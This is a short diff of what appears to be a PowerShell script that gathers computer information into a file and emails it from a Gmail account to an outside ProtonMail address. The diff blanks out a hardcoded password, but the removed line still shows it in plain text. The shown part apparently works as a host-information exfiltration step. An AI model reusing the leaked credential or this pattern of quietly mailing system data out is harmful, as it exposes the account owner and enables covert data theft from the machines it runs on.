@@ -22,7 +22,7 @@ Get-Computerinfo | Out-File -append $filename
 
 # Email results
 $FROM = "plextitannewsletter@gmail.com"
-$PASS = "BkZ7nDEHhCt8"
+$PASS = ""
 $TO = "b.streber@protonmail.com"
 
 $PC_NAME = "$env:computername"
